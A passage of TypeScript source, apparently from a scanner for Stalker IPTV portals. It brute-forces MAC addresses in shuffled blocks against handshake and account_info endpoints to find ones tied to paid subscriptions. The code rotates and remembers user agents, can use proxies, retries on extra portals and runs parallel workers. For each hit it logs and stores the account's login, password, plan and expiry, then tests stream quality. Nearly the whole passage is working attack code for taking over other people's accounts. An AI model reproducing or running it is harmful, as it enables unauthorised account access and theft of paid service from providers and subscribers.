          "warning",
          `Extra portal skipped: ${extraUrl} (${err instanceof Error ? err.message : "unreachable"})`
        );
      }
    }
    if (portalAlternatives.length > 0) {
      await addLog(
        jobId,
        "info",
        `Second-chance re-check enabled: rejected MACs are retried on ${portalAlternatives.length} extra portal(s) (${portalAlternatives
          .map((target) => target.host)
          .join(", ")})`
      );
    }

    // ── Global settings used by the optional add-ons ──────────────────
    const allSettings = await db.select().from(settings);
    const settingsMap = Object.fromEntries(allSettings.map((row) => [row.key, row.value || ""]));
    const userAgents = parseUserAgentList(settingsMap.ua_list);
    const rememberedUserAgent = settingsMap[userAgentSettingKey(portalHost)] || null;
    const proxyPool = parseProxyList(settingsMap.proxy_list).filter((proxy) => proxy);
    const proxyEnabled = (job as { proxyEnabled?: number }).proxyEnabled === 1 && proxyPool.length > 0;
    const scanProxy = proxyEnabled ? proxyPool[0] : null;
    if (scanProxy) {
      await addLog(
        jobId,
        "info",
        `Egress proxy available: ${scanProxy.host}:${scanProxy.port} (used for stream probes and quality checks)`
      );
    }

    // ── User-agent rotation (per portal host, remembered in settings) ──
    const serialNumber = computeSerialNumber(firstMacForProbe(macPrefix, macList), serverPath);
    let scanRequestOptions: PortalRequestOptions = { userAgent: rememberedUserAgent, serialNumber };

    if ((job.uaRotationEnabled ?? 1) !== 0) {
      const candidates = buildUserAgentCandidates(rememberedUserAgent, userAgents);
      if (candidates.length > 1 || !rememberedUserAgent) {
        const probeMac = firstMacForProbe(macPrefix, macList);
        for (let index = 0; index < candidates.length; index += 1) {
          if (!(await waitForAllowedWindow())) return;
          const token = await doHandshake(serverPath, portalBase, probeMac, timeoutMs, isAborted, {
            userAgent: candidates[index],
            serialNumber,
          });
          if (token) {
            scanRequestOptions = { userAgent: candidates[index], serialNumber };
            if (candidates[index] !== rememberedUserAgent) {
              await addLog(
                jobId,
                "success",
                index === 0
                  ? `User agent remembered for ${portalHost}`
                  : `User-agent rotation: candidate ${index + 1}/${candidates.length} worked — remembering it for ${portalHost}`
              );
              await db
                .insert(settings)
                .values({ key: userAgentSettingKey(portalHost), value: candidates[index] })
                .onConflictDoUpdate({
                  target: settings.key,
                  set: { value: candidates[index], updatedAt: new Date() },
                });
            }
            break;
          }
          await addLog(
            jobId,
            "warning",
            `Handshake failed with user agent ${index + 1}/${candidates.length} (${candidates[index].slice(0, 40)}…)`
          );
        }
      }
    }
    await addLog(jobId, "info", `Serial number (fingerprint): ${serialNumber}`);

    if (!(await waitForAllowedWindow())) return;
    // Opportunistic housekeeping: thumbnails older than two weeks are pruned.
    void pruneThumbnails().catch(() => undefined);

    // ── Resolve server geolocation once at the beginning. ─────────────
    if (!(await waitForAllowedWindow())) return;
    await addLog(jobId, "info", "Resolving server IP and location...");
    const serverGeo = await resolveServerLocation(job.portalUrl);
    if (serverGeo.ip) {
      await addLog(jobId, "success", `Server location: ${serverGeo.label}`);
    } else {
      await addLog(jobId, "warning", "Could not determine server geolocation");
    }

    // ── TCP portal-connectivity diagnostics ───────────────────────────
    if (!(await waitForAllowedWindow())) return;
    await addLog(jobId, "info", "Measuring portal connectivity (TCP connection probes)...");

    // This is deliberately a short portal-path spot check, not a packet-loss
    // or video-stream test. A bounded timeout prevents a filtered TCP port
    // from delaying scan startup indefinitely.
    const tcpProbeCount = 8;
    const tcpProbeIntervalMs = 250;
    let pingStats: TcpPingResult | null = null;
    let pingError: string | null = null;

    try {
      const { host, port } = parseHostPort(serverPath);
      await addLog(
        jobId,
        "info",
        `Testing TCP connection to portal ${host}:${port} (${tcpProbeCount} probes, ${tcpProbeIntervalMs}ms apart)...`
      );
      pingStats = await tcpPing(host, port, {
        probes: tcpProbeCount,
        intervalMs: tcpProbeIntervalMs,
        timeoutMs: Math.min(2000, Math.max(1000, timeoutMs)),
      });

      if (pingStats.successful > 0) {
        await addLog(
          jobId,
          "success",
          `Portal TCP connect: min ${pingStats.minMs?.toFixed(1)}ms · median ${pingStats.p50Ms?.toFixed(1)}ms · ` +
            `p95 ${pingStats.p95Ms?.toFixed(1)}ms · max ${pingStats.maxMs?.toFixed(1)}ms · ` +
            `${pingStats.successful}/${pingStats.probes} connected · ` +
            `${pingStats.failed} failed (${pingStats.failurePct.toFixed(1)}%) over ${pingStats.sampleWindowMs.toFixed(0)}ms`
        );
      } else {
        pingError = "All TCP connection probes failed or timed out";
        await addLog(jobId, "warning", pingError);
      }
    } catch (err) {
      pingError = err instanceof Error ? err.message : "Unknown error";
      await addLog(jobId, "warning", `Portal TCP connection probe failed: ${pingError}`);
    }

    // ── HTTP timing waterfall ─────────────────────────────────────────
    if (!(await waitForAllowedWindow())) return;
    await addLog(jobId, "info", "Measuring HTTP response time (DNS/TCP/TLS/TTFB)...");

    let httpTimings: {
      dnsMs: number | null;
      tcpMs: number | null;
      tlsMs: number | null;
      ttfbMs: number | null;
      totalMs: number;
      statusCode: number | null;
      error?: string;
    } = {
      dnsMs: null, tcpMs: null, tlsMs: null, ttfbMs: null,
      totalMs: 0, statusCode: null, error: undefined,
    };

    try {
      const handshakeUrl =
        `${serverPath}?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml`;
      const timing = await measureHttpRequest(handshakeUrl, {
        timeoutMs: Math.max(5000, timeoutMs * 2),
        headers: {
          Cookie: `mac=00:1A:79:00:00:00; stb_lang=en; timezone=${STB_REQUEST_TIMEZONE}`,
          Referer: portalBase,
        },
      });
      httpTimings = timing;

      if (timing.statusCode && !timing.error) {
        const breakdown = [
          timing.dnsMs !== null ? `DNS ${timing.dnsMs.toFixed(0)}ms` : null,
          timing.tcpMs !== null ? `TCP ${timing.tcpMs.toFixed(0)}ms` : null,
          timing.tlsMs !== null ? `TLS ${timing.tlsMs.toFixed(0)}ms` : null,
          timing.ttfbMs !== null ? `TTFB ${timing.ttfbMs.toFixed(0)}ms` : null,
        ]
          .filter(Boolean)
          .join(" · ");
        await addLog(
          jobId,
          "success",
          `HTTP timing: ${breakdown} · total ${timing.totalMs.toFixed(0)}ms (status ${timing.statusCode})`
        );
      } else {
        await addLog(jobId, "warning", `HTTP timing failed: ${timing.error || "no response"}`);
      }
    } catch (err) {
      httpTimings.error = err instanceof Error ? err.message : "Unknown error";
      await addLog(jobId, "warning", `HTTP timing failed: ${httpTimings.error}`);
    }

    // ── Persist diagnostics + geolocation on the job row ──────────────
    const diagnosticsAt = new Date();
    await db
      .update(scanJobs)
      .set({
        status: "running",
        updatedAt: new Date(),
        // TCP connection sampling (not packet loss or stream jitter)
        pingMinMs: pingStats?.minMs ?? null,
        pingAvgMs: pingStats?.avgMs ?? null,
        pingMaxMs: pingStats?.maxMs ?? null,
        pingStdevMs: pingStats?.stdevMs ?? null,
        pingLossPct: pingStats?.failurePct ?? null,
        pingProbes: pingStats?.probes ?? 0,
        pingSuccessful: pingStats?.successful ?? 0,
        pingProbeMs: tcpProbeIntervalMs,
        pingP50Ms: pingStats?.p50Ms ?? null,
        pingP95Ms: pingStats?.p95Ms ?? null,
        pingWindowMs: pingStats ? Math.round(pingStats.sampleWindowMs) : null,
        pingRtts: pingStats?.rtts ?? null,
        diagnosticsAt,
        pingError,
        // Single HTTP timing sample for the Stalker handshake endpoint
        httpDnsMs: httpTimings.dnsMs,
        httpTcpMs: httpTimings.tcpMs,
        httpTlsMs: httpTimings.tlsMs,
        httpTtfbMs: httpTimings.ttfbMs,
        httpTotalMs: httpTimings.totalMs,
        httpStatusCode: httpTimings.statusCode,
        httpError: httpTimings.error || null,
        // Geolocation
        serverIp: serverGeo.ip,
        serverGeoRaw: serverGeo.raw,
      })
      .where(eq(scanJobs.id, jobId));

    if (!(await waitForAllowedWindow())) return;

    await addLog(jobId, "info", "");
    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", "        Scan Started - Testing MACs");
    await addLog(jobId, "info", "════════════════════════════════════════");

    if (haEntityId) {
      await addLog(jobId, "info", `Home Assistant entity: ${haEntityId}`);
      await addLog(jobId, "info", "HA entity will update when valid MACs are found");
    } else {
      await addLog(jobId, "info", "Home Assistant integration: Not configured");
    }

    await addLog(jobId, "info", "MAC addresses will be tested in RANDOM order (block-shuffle).");
    await addLog(jobId, "info", "A MAC only counts as valid if account_info returns meaningful subscription data.");

    // ── Build the randomised iteration order ──
    // 1. Shuffle the block order so we don't scan linearly.
    // 2. Within each block, shuffle the indices so even adjacent MACs are tested
    //    in random order.
    //
    // Memory usage:
    //   blockOrder array  ≈ totalBlocks × 4 bytes  (e.g., 1 678 × 4 ≈ 7 KB)
    //   current block     ≈ BLOCK_SIZE  × 4 bytes  (10 000 × 4 ≈ 40 KB)
    //   Total peak        ≈ ~50 KB  (vs > 500 MB for a full Set of 16.7 M MACs)

    const blockSize = job.blockSize || DEFAULT_BLOCK_SIZE;
    const blockOrder = createShuffledBlockOrder(totalCombinations, blockSize);
    const totalBlocks = blockOrder.length;

    const blockArrayMemKB = Math.ceil((totalBlocks * 4) / 1024);
    const perBlockMemKB   = Math.ceil((blockSize * 4) / 1024);
    const totalMemKB      = blockArrayMemKB + perBlockMemKB;

    await addLog(
      jobId,
      "info",
      `Block size: ${blockSize.toLocaleString()} MACs per block`
    );
    await addLog(
      jobId,
      "info",
      `Split into ${totalBlocks.toLocaleString()} blocks — est. memory: ~${totalMemKB} KB`
    );
    await addLog(jobId, "info", "");

    let tested = 0;
    let found = 0;
    let abortedEarly = false;

    // ── Outer loop: iterate over shuffled blocks ──
    for (let bi = 0; bi < totalBlocks && !abortedEarly; bi++) {
      if (isAborted()) {
        await addLog(jobId, "warning", "Scan abort signal received - stopping now");
        abortedEarly = true;
        break;
      }

      // Check DB status every block to catch external stops.
      if (bi > 0) {
        const [cur] = await db
          .select()
          .from(scanJobs)
          .where(eq(scanJobs.id, jobId))
          .limit(1);

        if (!cur || cur.status === "paused" || cur.status === "completed") {
          await addLog(jobId, "warning", "Scan status changed externally - stopping loop");
          abortedEarly = true;
          break;
        }
      }

      const blockIdx = blockOrder[bi];
      const indices = createShuffledBlockIndices(blockIdx, totalCombinations, blockSize);

      // Log block progress periodically (every 10 blocks)
      if (bi % 10 === 0) {
        await addLog(
          jobId,
          "info",
          `Processing block ${bi + 1}/${totalBlocks} — ${tested.toLocaleString()} MACs tested so far, ${found} valid found`
        );
      }

      // ── Inner loop: iterate over shuffled indices within block ──
      //
      // With concurrency > 1 the block's index list is split into interleaved
      // slices, each running this same sequential loop. Interleaving keeps MACs
      // spread across the address space, and a shared per-host rate limiter
      // stops parallel workers from bursting the portal.
      const runSlice = async (slice: number[]): Promise<void> => {
      for (const macIndex of slice) {
        if (isAborted() || !(await waitForAllowedWindow())) {
          abortedEarly = true;
          break;
        }

        if (scanConcurrency > 1) {
          await portalRateLimiter.wait(portalHost);
        }

        // Prefix enumeration or an explicit MAC list (bulk mode).
        const mac = macListMode ? (macList![macIndex] as string) : buildMacAddressFromIndex(macPrefix, macIndex);
        tested += 1;

        // Update progress in DB every 5 MACs
        if (tested % 5 === 0) {
          await db
            .update(scanJobs)
            .set({
              totalTested: numberToDbInt(tested),
              totalFound: numberToDbInt(found),
              currentMac: mac,
              updatedAt: new Date(),
            })
            .where(eq(scanJobs.id, jobId));
        }

        // Log progress every 50 MACs
        if (tested % 50 === 0) {
          await addLog(
            jobId,
            "info",
            `Progress: ${tested.toLocaleString()} / ${totalCombinations.toLocaleString()} MACs tested, ${found} valid found`
          );
        }

        try {
          // Portal candidates for this MAC: the primary portal first, then one
          // rotating alternative when the job was given extra portals.
          const macTargets =
            portalAlternatives.length > 0
              ? [primaryTarget, portalAlternatives[(tested + blockIdx) % portalAlternatives.length]]
              : [primaryTarget];

          // STEP 1 – Handshake (token alone does NOT mean the MAC is valid).
          // Time the two portal requests separately so schedule pauses between
          // them are not mistaken for slow server response time.
          let macTarget = macTargets[0];
          let token: string | null = null;
          let accountResponse: PortalResponse<Record<string, unknown>> | null = null;
          let handshakeTimeMs = 0;
          let accountInfoTimeMs = 0;

          for (let targetIndex = 0; targetIndex < macTargets.length; targetIndex += 1) {
            const target = macTargets[targetIndex];
            const macTestStart = performance.now();
            token = await doHandshake(target.serverPath, target.portalBase, mac, timeoutMs, isAborted, scanRequestOptions);
            handshakeTimeMs = Math.round(performance.now() - macTestStart);
            if (!token) continue;
            if (!(await waitForAllowedWindow())) {
              abortedEarly = true;
              break;
            }

            // STEP 2 – Account info (the REAL validation)
            const accountInfoStart = performance.now();
            accountResponse = await fetchAccountInfo(
              target.serverPath,
              target.portalBase,
              mac,
              token,
              timeoutMs,
              isAborted,
              scanRequestOptions
            );
            accountInfoTimeMs = Math.round(performance.now() - accountInfoStart);

            if (accountResponse && isAccountInfoValid(accountResponse.payload)) {
              macTarget = target;
              break;
            }
            accountResponse = null;
            if (targetIndex + 1 < macTargets.length) {
              await addLog(
                jobId,
                "info",
                `MAC ${mac} rejected by ${target.host} — second-chance check on ${macTargets[targetIndex + 1].host}`
              );
            }
          }

          if (!token || !accountResponse || !isAccountInfoValid(accountResponse.payload)) {
            continue;
          }
          const accountInfo = accountResponse.payload;

          // Combined portal API time excludes scheduling waits and later
          // profile/category requests; it is not media startup time.
          const responseTimeMs = handshakeTimeMs + accountInfoTimeMs;

          // ── Early-expire filter (cheap — no extra HTTP needed) ────────
          // Extract the expiry from account_info (`phone` first, ignoring
          // zero-date placeholders). When account_info already provides a
          // concrete expiry date, we can filter immediately before fetching
          // profile/categories; if account_info has no expiry date yet, we
          // re-check after fetchProfile below.
          const earlyExpiry = extractPortalExpiry(null, accountInfo);
          if (expireFilter.enabled && earlyExpiry) {
            const expiryCheck = expiryPassesFilter(expireFilter, earlyExpiry);
            if (!expiryCheck.pass) {
              filteredOut += 1;
              await addLog(
                jobId,
                "info",
                `MAC ${mac} valid but filtered out by expire date (${expiryCheck.reason})`
              );
              continue;
            }
          }

          // ── Valid MAC found (account-info-wise) ──────────────────────
          found += 1;

          await addLog(jobId, "info", "");
          await addLog(jobId, "success", "╔══════════════════════════════════════╗");
          await addLog(jobId, "success", "║      VALID MAC ADDRESS FOUND!        ║");
          await addLog(jobId, "success", "╚══════════════════════════════════════╝");
          await addLog(jobId, "success", `MAC Address: ${mac}`);

          // STEP 3 – Fetch additional data (profile, genres, VOD)
          // When the genre filter is disabled we still fetch profile for
          // account details, but we can skip the category HTTP calls to
          // save time/load.
          await addLog(jobId, "info", "Fetching additional account details...");

          if (!(await waitForAllowedWindow())) {
            abortedEarly = true;
            break;
          }
          const profileResponse = await fetchProfile(
            macTarget.serverPath,
            macTarget.portalBase,
            mac,
            token,
            timeoutMs,
            isAborted,
            scanRequestOptions
          );
          const profileInfo = profileResponse?.payload ?? null;
          if (profileResponse) {
            await addLog(jobId, "info", "✓ Profile data retrieved");
          } else {
            await addLog(jobId, "warning", "✗ Could not retrieve profile data");
          }

          // Extract common fields for the results table while keeping every
          // original endpoint response in rawData below. Field provenance is
          // saved separately so a portal default is not mistaken for a
          // device/account setting.
          const extractedFields = extractPortalFields(profileInfo, accountInfo);
          const expiry = extractedFields.expireDate ?? "";

          if (expireFilter.enabled) {
            const expiryCheck = expiryPassesFilter(expireFilter, expiry);
            if (!expiryCheck.pass) {
              filteredOut += 1;
              found -= 1; // don't count as a successful find
              await addLog(
                jobId,
                "info",
                `MAC ${mac} valid but filtered out by expire date (${expiryCheck.reason})`
              );
              continue;
            }
          }

          // Decide which category lists we actually need.  We ALWAYS need
          // ITV genres and VOD categories when genre filter is OFF because
          // they're written into the saved result (playlistGenres / vodCats).
          // When filter is ON we additionally need series categories if
          // matchSeries is true; we skip a list when it's not needed for
          // either filter or output.
          const needLive = !genreFilter.enabled || genreFilter.matchLive;
          const needVod = !genreFilter.enabled || genreFilter.matchVod;
          const needSeries = genreFilter.enabled && genreFilter.matchSeries;

          let itvGenres: Array<{ id: string; title: string }> | null = null;
          let vodCategories: Array<{ id: string; title: string }> | null = null;
          let seriesCategories: Array<{ id: string; title: string }> | null = null;
          let itvResponse: PortalCategoryResponse | null = null;
          let vodResponse: PortalCategoryResponse | null = null;
          let seriesResponse: PortalCategoryResponse | null = null;

          if (!(await waitForAllowedWindow())) {
            abortedEarly = true;
            break;
          }
          if (needLive) {
            itvResponse = await fetchGenres(
              macTarget.serverPath,
              macTarget.portalBase,
              mac,
              token,
              "itv",
              timeoutMs,
              isAborted,
              scanRequestOptions
            );
            itvGenres = itvResponse?.entries ?? null;
            if (itvGenres && itvGenres.length > 0) {
              await addLog(jobId, "info", `✓ Retrieved ${itvGenres.length} ITV genres`);
            } else {
              await addLog(jobId, "warning", "✗ Could not retrieve ITV genres");
            }
          }

          if (!(await waitForAllowedWindow())) {
            abortedEarly = true;
            break;
          }
          if (needVod) {
            vodResponse = await fetchGenres(
              macTarget.serverPath,
              macTarget.portalBase,
              mac,
              token,
              "vod",
              timeoutMs,
              isAborted,
              scanRequestOptions
            );
            vodCategories = vodResponse?.entries ?? null;
            if (vodCategories && vodCategories.length > 0) {
              await addLog(jobId, "info", `✓ Retrieved ${vodCategories.length} VOD categories`);
            } else {
              await addLog(jobId, "warning", "✗ Could not retrieve VOD categories");
            }
          }

          if (needSeries) {
            if (!(await waitForAllowedWindow())) {
              abortedEarly = true;
              break;
            }
            seriesResponse = await fetchGenres(
              macTarget.serverPath,
              macTarget.portalBase,
              mac,
              token,
              "series",
              timeoutMs,
              isAborted,
              scanRequestOptions
            );
            seriesCategories = seriesResponse?.entries ?? null;
            if (seriesCategories && seriesCategories.length > 0) {
              await addLog(jobId, "info", `✓ Retrieved ${seriesCategories.length} Series categories`);
            } else {
              await addLog(jobId, "warning", "✗ Could not retrieve Series categories (portal may not support them)");
            }
          }

          // ── Genre filter (requires categories to have been fetched) ──
          if (genreFilter.enabled) {
            const genreCheck = genresPassFilter(
              genreFilter,
              itvGenres,
              vodCategories,
              seriesCategories
            );
            if (!genreCheck.pass) {
              filteredOut += 1;
              found -= 1; // don't count as a successful find
              await addLog(
                jobId,
                "info",
                `MAC ${mac} valid but filtered out by genre (no matching categories for keywords: ${genreFilter.keywords})`
              );
              continue;
            }
            if (genreCheck.matchedTitle) {
              await addLog(
                jobId,
                "success",
                `Genre match: "${genreCheck.matchedTitle}"`
              );
            }
          }

          const combined = { ...profileInfo, ...accountInfo };
          const password = String(profileInfo?.password || profileInfo?.pass || "");
          const login = String(profileInfo?.login || profileInfo?.username || mac);
          const timezone = extractedFields.timezone ?? "";
          const playlistGenres = itvGenres ? itvGenres.map((g) => g.title).join(", ") : "";
          const vodCats = vodCategories ? vodCategories.map((g) => g.title).join(", ") : "";
          const tariff =
            (combined.tariff_plan as { name?: string })?.name ||
            String(combined.tariff_plan || "");

          // IMPORTANT: In Stalker middleware responses the `phone` field
          // contains the subscription EXPIRATION DATE, NOT a real telephone
          // number. `extractPortalFields` prioritizes `phone` (from
          // `account_info`, then `get_profile`) before `end_date` /
          // `expire_billing_date` and skips MySQL zero-date placeholders such
          // as "0000-00-00 00:00:00".
          const phoneNumber = extractedFields.phoneNumber ?? "";

          // Log the normalized fields and their values. All original response
          // bodies and field-source paths are also retained in rawData.
          await addLog(jobId, "success", `Expiry: ${expiry || "N/A"}`);
          await addLog(jobId, "success", `Plan: ${tariff || "N/A"}`);
          await addLog(jobId, "success", `Phone Number: ${phoneNumber || "N/A"}`);
          await addLog(jobId, "success", `Password: ${password || "N/A"}`);
          await addLog(jobId, "success", `Max Connections: ${extractedFields.maxConnections ?? "N/A"}`);
          await addLog(jobId, "success", `Active Connections: ${extractedFields.activeConnections ?? "N/A"}`);
          await addLog(jobId, "success", `Portal Timezone: ${timezone || "N/A"}`);
          await addLog(jobId, "success", `Created At: ${extractedFields.createdAt?.toISOString() || "N/A"}`);
          await addLog(jobId, "success", `Portal Online: ${extractedFields.portalOnline ?? "N/A"}`);
          await addLog(jobId, "success", `Last Active: ${extractedFields.lastActive ?? "N/A"}`);
          await addLog(jobId, "success", `Server Location: ${serverGeo.label}`);
          await addLog(jobId, "info", "Saving valid result and complete responses from requested portal endpoints...");

          // Log response time alongside the result.
          await addLog(jobId, "success", `Response time: ${responseTimeMs}ms`);

          // Save to database
          const [savedResult] = await db.insert(scanResults).values({
            jobId,
            macAddress: mac,
            portalUrl: job.portalUrl,
            expireDate: expiry,
            serverLocation: serverGeo.label,
            tariffPlan: tariff,
            maxConnections: extractedFields.maxConnections,
            activeConnections: extractedFields.activeConnections,
            createdAt: extractedFields.createdAt,
            portalOnline: extractedFields.portalOnline,
            lastActive: extractedFields.lastActive,
            accountStatus: String(combined.status ?? ""),
            phoneNumber,
            responseTimeMs,
            handshakeTimeMs,
            accountInfoTimeMs,
            timezone,
            username: login,
            password,
            playlistGenres,
            vodCategories: vodCats,
            rawData: {
              // Keep the decoded profile/account payloads for existing readers.
              profile: profileInfo,
              account: accountInfo,
              // Also keep the complete JSON envelopes and response metadata so
              // fields outside the current normalized mapping are not lost.
              portalResponses: {
                profile: {
                  requested: true,
                  response: responseForStorage(profileResponse),
                },
                accountInfo: {
                  requested: true,
                  response: responseForStorage(accountResponse),
                },
                categories: {
                  itv: {
                    requested: needLive,
                    response: responseForStorage(itvResponse),
                  },
                  vod: {
                    requested: needVod,
                    response: responseForStorage(vodResponse),
                  },
                  series: {
                    requested: needSeries,
                    response: responseForStorage(seriesResponse),
                  },
                },
              },
              // These lists remain convenient for the table/filter code. The
              // full category objects are preserved under portalResponses.
              itvGenres,
              vodCategories,
              seriesCategories,
              serverGeo,
              requestContext: {
                timezoneCookieSent: STB_REQUEST_TIMEZONE,
                note: "Client-supplied request value; not a portal-reported device timezone.",
              },
              fieldProvenance: extractedFields.provenance,
            },
            stalkerServerPath: macTarget.serverPath,
          }).returning();

          await addLog(jobId, "info", "Result saved successfully");

          // ── Stream quality / speed / stability check ──────────────────
          // The MAC is valid and passed the user's filters. Now measure the
          // media path: list channels, resolve a spread of them with
          // create_link and probe the real streams (speed, resolution/codec,
          // transport-stream stability). Failures here never fail the scan.
          if (qualityCheck.enabled && savedResult) {
            if (!(await waitForAllowedWindow())) {
              abortedEarly = true;
              break;
            }
            await addLog(
              jobId,
              "info",
              `Checking stream quality for ${mac} (${qualityCheck.channels} channel(s), ${(
                qualityCheck.sampleMs / 1000
              ).toFixed(0)}s each)...`
            );

            try {
              const qualityReport = await checkMacStreamQuality({
                serverPath: macTarget.serverPath,
                portalBase: macTarget.portalBase,
                mac,
                timeoutMs,
                channelsToProbe: qualityCheck.channels,
                sampleMs: qualityCheck.sampleMs,
                signal: controller.signal,
                userAgents,
                rememberedUserAgent: scanRequestOptions.userAgent,
                onUserAgentResolved: async (userAgent) => {
                  await db
                    .insert(settings)
                    .values({ key: userAgentSettingKey(portalHost), value: userAgent })
                    .onConflictDoUpdate({
                      target: settings.key,
                      set: { value: userAgent, updatedAt: new Date() },
                    });
                },
                proxy: scanProxy,
                pictureChecks: qualityCheck.pictureChecks,
                thumbnails: qualityCheck.thumbnails,
                checkCatchUp: qualityCheck.catchUp,
                concurrency: qualityCheck.concurrency,
              });

              for (const line of formatMacQualityLog(qualityReport)) {
                await addLog(jobId, line.level, line.message);
              }

              const aggregate = qualityReport.aggregate;
              const measuredChannel = qualityReport.channels.find((entry) => entry.probe);
              const thumbnailChannel = qualityReport.channels.find((entry) => entry.thumbnail);

              // Probe history → EWMA + trend (trust over time).
              const history = await recordProbeRun(savedResult.id, jobId, mac, qualityReport);
              const ewma = history.ewma;
              const trend = history.trend;
              const degradation = detectDegradation(history.runs);

              await db
                .update(scanResults)
                .set({
                  qualityVerdict: aggregate.verdict,
                  qualityScore: aggregate.overallScore,
                  qualitySpeedScore: aggregate.speedScore,
                  qualityQualityScore: aggregate.qualityScore,
                  qualityStabilityScore: aggregate.stabilityScore,
                  qualityResolution: measuredChannel?.probe?.resolution?.label ?? null,
                  qualityCodec: measuredChannel?.probe?.videoCodec ?? null,
                  qualityThroughputMbps: measuredChannel?.probe?.sustainedMbps ?? null,
                  qualityRequiredMbps: measuredChannel?.probe?.requiredMbps ?? null,
                  qualityChannelsPlayable: aggregate.channelsPlayable,
                  qualityChannelsProbed: aggregate.channelsProbed,
                  qualityCheckedAt: new Date(qualityReport.measuredAt),
                  qualityReport,
                  qualityFrozen: aggregate.frozenChannels > 0 ? 1 : 0,
                  qualityLabelMismatch: aggregate.labelMismatches > 0 ? `${aggregate.labelMismatches} channel(s) mislabeled` : null,
                  qualityRetries: measuredChannel?.probe?.retryCount ?? 0,
                  qualityThroughputCv: measuredChannel?.probe?.throughputCoefficientOfVariation ?? null,
                  qualityCatchUpStatus: qualityReport.catchUp?.status ?? "not_checked",
                  qualityCatchUpDays: qualityReport.catchUp?.verifiedMinutes
                    ? qualityReport.catchUp.verifiedMinutes / (60 * 24)
                    : null,
                  qualityThumbnail: thumbnailChannel?.thumbnail ?? null,
                  qualityEwma: ewma,
                  qualityTrend: trend,
                  qualityGenreSummary: qualityReport.genreGroups,
                })
                .where(eq(scanResults.id, savedResult.id));

              if (degradation.degraded) {
                await addLog(
                  jobId,
                  "warning",
                  `ALERT: ${mac} is degrading — latest ${degradation.latest?.toFixed(1)} vs EWMA ${degradation.ewma?.toFixed(
                    1
                  )} (drop ${degradation.drop?.toFixed(1)}, ${history.runs.length} probe runs)`
                );
              }
              await addLog(jobId, "info", "Stream quality report saved");
            } catch (qualityError) {
              await addLog(
                jobId,
                "warning",
                `Stream quality check failed: ${
                  qualityError instanceof Error ? qualityError.message : "Unknown error"
                }`
              );
            }
          }

          // Update job progress
          await db
            .update(scanJobs)
            .set({
              totalTested: numberToDbInt(tested),
              totalFound: numberToDbInt(found),
              currentMac: mac,
              updatedAt: new Date(),
            })
            .where(eq(scanJobs.id, jobId));

          // Update Home Assistant
          if (haUrl && haToken && haEntityId) {
            const ok = await sendToHomeAssistant(haUrl, haToken, haEntityId, numberToDbInt(found), {
              last_mac: mac,
              portal: job.portalUrl,
              last_updated: new Date().toISOString(),
              server_location: serverGeo.label,
            });

            if (ok) {
              await addLog(jobId, "info", `Home Assistant updated: ${haEntityId} = ${found}`);
            } else {
              await addLog(jobId, "warning", "Failed to update Home Assistant entity");
            }
          }
        } catch (err) {
          if (isAborted()) { abortedEarly = true; break; }
          await addLog(
            jobId,
            "error",
            `Error testing MAC ${mac}: ${err instanceof Error ? err.message : "Unknown error"}`
          );
        }

        // Small delay to avoid overwhelming the portal
        await new Promise((r) => setTimeout(r, 100));
      } // end inner block loop
      };

      // Run the slice(s): one worker when sequential, N interleaved workers
      // when the user asked for concurrency (capped, rate-limited).
      const slices: number[][] = [];
      if (scanConcurrency > 1) {
        for (let worker = 0; worker < scanConcurrency; worker += 1) {
          slices.push(indices.filter((_, position) => position % scanConcurrency === worker));
        }
      } else {
        slices.push(indices);
      }
      await Promise.all(slices.map((slice) => runSlice(slice)));
      if (isAborted()) {
        abortedEarly = true;
        break;
      }
    } // end outer block loop

    // ── Final status ──
    const scannedAllMacs = !abortedEarly && tested >= totalCombinations;
    const finalStatus = abortedEarly ? "paused" : "completed";

    if (scannedAllMacs) {
      await addLog(jobId, "warning", "All MAC addresses in the selected prefix space have been searched.");
      await addLog(jobId, "warning", "No more MACs remain to test. Stopping scanner.");
    }

    await db
      .update(scanJobs)
      .set({
        status: finalStatus,
        totalTested: numberToDbInt(tested),
        totalFound: numberToDbInt(found),
        updatedAt: new Date(),
      })
      .where(eq(scanJobs.id, jobId));

    await addLog(jobId, "info", "");
    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", `        Scan ${finalStatus.toUpperCase()}`);
    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", `Total MACs tested: ${tested.toString()}`);
    await addLog(jobId, "info", `Valid MACs found before reset: ${found.toString()}`);
    await addLog(jobId, "info", "Resetting visible found counter to 0...");

    // User explicitly requested reset of the valid-found counter and HA entity
    // when the user stops the scan OR when all MACs are exhausted / scan ends.
    await resetFoundCounterAndHa(
      jobId,
      abortedEarly ? "stopped" : scannedAllMacs ? "exhausted" : "completed"
    );

    await addLog(jobId, "info", "Found counter reset to 0");
    if (haEntityId) {
      await addLog(jobId, "info", "Home Assistant entity reset to 0");
    }
    await addLog(jobId, "info", "Scanner stopped");
    await addLog(jobId, "info", "════════════════════════════════════════");
  } catch (err) {
    await addLog(jobId, "error", "════════════════════════════════════════");
    await addLog(jobId, "error", "        SCAN FAILED - FATAL ERROR");
    await addLog(jobId, "error", "════════════════════════════════════════");
    await addLog(
      jobId,
      "error",
      `Error: ${err instanceof Error ? err.message : "Unknown error"}`
    );

    await db
      .update(scanJobs)
      .set({ status: "error", updatedAt: new Date() })
      .where(eq(scanJobs.id, jobId));
  } finally {
    activeScans.delete(jobId);
  }
}

// ============================================================================
// STOP / STATUS HELPERS
// ============================================================================

export async function stopScan(jobId: number): Promise<boolean> {
  const controller = activeScans.get(jobId);

  if (controller) {
    controller.abort();
    activeScans.delete(jobId);

    try {
      await resetFoundCounterAndHa(jobId, "stopped");
    } catch {
      // Ignore reset problems during stop.
    }

    return true;
  }

  return false;
}

export function isScanRunning(jobId: number): boolean {
  return activeScans.has(jobId);
}

export function getActiveScans(): number[] {
  return Array.from(activeScans.keys());
}

// ============================================================================
// PROBE HISTORY (trust over time)
// ============================================================================

/**
 * Append one row to quality_probe_runs and return the row plus the updated
 * EWMA/trend across all runs stored for that result.
 */
async function recordProbeRun(
  resultId: number,
  jobId: number,
  mac: string,
  report: { aggregate: { overallScore: number | null; speedScore: number | null; qualityScore: number | null; stabilityScore: number | null; verdict: string; channelsPlayable: number; channelsProbed: number; frozenChannels: number; labelMismatches: number }; channels: Array<{ probe: { sustainedMbps: number | null; requiredMbps: number | null } | null }>; portal?: { viaProxy: string | null } }
): Promise<{ runs: ProbeRun[]; ewma: number | null; trend: string }> {
  const measuredChannel = report.channels.find((channel) => channel.probe);
